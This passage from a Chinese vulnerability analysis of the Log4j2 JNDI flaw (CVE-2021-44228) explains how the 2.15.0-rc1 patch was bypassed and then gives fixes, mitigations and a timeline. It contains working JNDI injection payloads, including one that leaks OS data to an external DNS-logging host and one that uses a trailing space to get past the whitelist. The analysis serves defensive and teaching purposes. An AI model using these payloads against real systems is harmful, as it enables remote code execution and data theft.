但是这种回显的数据是有限制的，例如下面这种情况，使用如下payload
    ${jndi:ldap://${java:os}.2lnhn2.ceye.io}
执行完成后请求的地址如下
最后会报如下错误，并且无法回显
## 0x06 2.15.0 rc1绕过详解
在Apache
log4j2漏洞大肆传播的当天，log4j2官方发布的rc1补丁就传出的被绕过的消息，于是第一时间也跟着研究究竟是怎么绕过的，分析完后发现，这个“绕过”属实是一言难尽，下面就针对这个绕过来解释一下为何一言难尽。
首先最重要的一点，就是需要修改配置，默认配置下是不能触发JNDI远程加载的，单就这个条件来说我觉得就很勉强了，但是确实更改了配置后就可以触发漏洞，所以这究竟算不算绕过，还要看各位同学自己的看法了。
首先在这次补丁中MessagePatternConverter类进行了大改，可以看下修改前后MessagePatternConverter这个类的结构对比
修改前
修改后
可以很清楚的看到
增加了三个静态内部类，每个内部类都继承自MessagePatternConverter，且都实现了自己的format方法。之前执行链上的MessagePatternConverter.format()方法则变成了下面这样
在rc1这个版本中Log4j2在初始化的时候创建的Converter也变了，
整理一下，可以看的更清晰一些
    DatePatternConverter
    SimpleLiteralPatternConverter$StringValue
    ThreadNamePatternConverter
    LevelPatternConverter$SimpleLevelPatternConverter
    LoggerPatternConverter
    MessagePatternConverter$SimpleMessagePatternConverter
    LineSeparatorPatternConverter
    ExtendedThrowablePatternConverter
之前的MessagePatternConverter，变成了现在的MessagePatternConverter$SimpleMessagePatternConverter，那么这个SimpleMessagePatternConverter的方法究竟是怎么实现的，如下所示
可以看到并没有对传入的数据进行“{}”这种形式传入数据的处理，开发者将其转移到了LookupMessagePatternConverter.format()方法中,如下所示
那么问题来了，如何才能让log4j2在初始化的时候就实例化LookupMessagePatternConverter从而能让程序在后续的执行过程中调用它的format方法呢？
其实很简单，但这也是我说这个绕过“一言难尽”的一个点，就是要修改配置文件，修改成如下所示在“%msg”的后面添加一个“{lookups}”，我相信一般情况下应该没有那个开发者会这么改配置文件玩，除非他真的需要log4j2提供的jndi
lookup功能，修改后的配置文件如下所示
这样一来就可以触发LookupMessagePatternConverter.format()方法了，但是单单只改配置，还是不行，因为JndiManager.lookup方法也进行了修改，增加了白名单校验，这就意味着我们还要修改payload来绕过这么一个校验，校验点代码如下所示
当判断以ldap开头的时候，就回去判断请求的host，也就是请求的地址，白名单内容如下所示
可以看到白名单里要么是本机地址，要么是内网地址，fe80开头的ipv6地址也是内网地址，看似想要绕过有些困难，因为都是内网地址，没法请求放在公网的ldap服务，不过不用着急，继续往下看。
使用marshalsec开启ldap服务后，先将payload修改成下面这样
    ${jndi:ldap://127.0.0.1:8088/ExportObject}
如此一来就可以绕过第一道校验，过了这个host校验后，还有一个校验，在JndiManager.lookup方法中，会将请求ladp服务后
ldap返回的信息以map的形式存储，如下所示
这里要求javaFactory为空，否则就会返回"Referenceable class is not allowed for
xxxxxx"的错误，想要绕过这一点其实也很简单，在JndiManager.lookup方法中有一个非常非常离谱的错误，就是在捕获异常后没有进行返回，甚至没有进行任何操作，我看不懂，但我大为震撼。这样导致了程序还会继续向下执行，从而走到最后的this.context.lookup()这一步
，如下所示
也就是说只要让lookup方法在执行的时候抛个异常就可以了，将payload修改成以下的形式
    ${jndi:ldap://xxx.xxx.xxx.xxx:xxxx/ ExportObject}
在url中“/”后加上一个空格，就会导致lookup方法中一开始实例化URI对象的时候报错，这样不仅可以绕过第二道校验，连第一个针对host的校验也可以绕过，从而再次造成RCE。在rc2中，catch错误之后，return
null，也就走不到lookup方法里了。
## 0x07 修复&临时建议
在最新的修复`https://github.com/apache/logging-log4j2/commit/44569090f1cf1e92c711fb96dfd18cd7dccc72ea`中，在初始化插值器时新增了检查jndi协议是否启用的选项，并且默认禁用了jndi协议的使用。
修复建议：
  1. 升级Apache Log4j2所有相关应用到最新版。
  2. 升级JDK版本，建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。但仍有绕过Java本身对Jndi远程加载类安全限制的风险。
临时建议： 1\. jvm中添加参数 -Dlog4j2.formatMsgNoLookups=true **（版本 >=2.10.0）**
  1. 新建log4j2.component.properties文件，其中加上配置log4j2.formatMsgNoLookups=true **（版本 >=2.10.0）**
  2. 设置系统环境变量：LOG4J_FORMAT_MSG_NO_LOOKUPS=true **（版本 >=2.10.0）**
  3. 对于log4j2 < 2.10以下的版本，可以通过移除JndiLookup类的方式。
## 0x08 时间线
  * 2021年11月24日: 阿里云安全团队向Apache 官方提交ApacheLog4j2远程代码执行漏洞（CVE-2021-44228）
  * 2021年12月8日: Apache Log4j2官方发布安全更新log4j2-2.15.0-rc1，
  * 2021年12月9日: 天融信阿尔法实验室晚间监测到poc大量传播并被利用攻击
  * 2021年12月10日: 天融信阿尔法实验室于10日凌晨发布Apache Log4j2 远程代码执行漏洞预警，并于当日发布Apache Log4j2 漏洞处置方案
  * 2021年12月10日: 同一天内，网络传出log4j2-2.15.0-rc1安全更新被绕过，天融信阿尔法实验室第一时间进行验证，发现绕过存在，并将处置方案内的升级方案修改为log4j2-2.15.0-rc2
  * 2021年12月15日：天融信阿尔法实验室对该漏洞进行了深入分析并更新修复建议。
## 0x09 总结
log4j2这次漏洞的影响是核弹级的，堪称web漏洞届的永恒之蓝，因为作为一个日志系统，有太多的开发者使用，也有太多的开源项目将其作为默认日志系统，所以可以见到，在未来的几年内，Apache
log4j2
很可能会接替Shiro的位置，作为护网的主要突破点。该漏洞的原理并不复杂，甚至如果认真读了官方文档可能就可以发现这个漏洞，因为这次的漏洞究其原理就是log4j2所提供的正常功能，但是不管是log4j2的开发者也好，还是使用log4j2进行开发的开发者也好，他们都犯了一个致命的错误，就是相信了用户的输入。永远不要相信用户的输入，想必这是每一个开发人员都听过的一句话，可惜，真正能做到的人太少了。对于开源软件的生态安全，也需要相关企业和组织加以关注和共同建设，安全之路任重而道远。
## 参考资料
  1. [Apache Log4j2 漏洞影响面查询](https://log4j2.huoxian.cn/layout)
  2. [log4j2 lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html)
  3. [log4j2 layouts](https://logging.apache.org/log4j/2.x/manual/layouts.html)
  4. [Java反序列化过程中 RMI JRMP 以及JNDI多种利用方式详解](http://blog.topsec.com.cn/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%87%e7%a8%8b%e4%b8%ad-rmi-jrmp-%e4%bb%a5%e5%8f%8ajndi%e5%a4%9a%e7%a7%8d%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f%e8%af%a6%e8%a7%a3/)
  5. [JAVA JNDI注入知识详解](http://blog.topsec.com.cn/java-jndi%e6%b3%a8%e5%85%a5%e7%9f%a5%e8%af%86%e8%af%a6%e8%a7%a3/)
  6. [Log4j 0day之rc1与rc2 有趣的绕过](https://mp.weixin.qq.com/s/_qA3ZjbQrZl2vowikdPOIg)
  7. [Log4j2 研究之lookup](https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg)
  8. [log4j2 JNDI 注入漏洞分析](https://www.cnpanda.net/sec/1114.html)
  9. [log4j2源码分析](https://www.jianshu.com/p/0c882ced0bf5)
  10. [代码审计-log4j2_rce分析](https://mp.weixin.qq.com/s/ZHcrraF2Agk8EEe-3_O18Q)
  11. [Apache Log4j2 Jndi RCE高危漏洞分析与防御](https://mp.weixin.qq.com/s/19oIId_Ax2nxJ00k6vFhDg)
  12. [Java日志的心路历程](https://blog.csdn.net/a1405/article/details/116561152)
* * *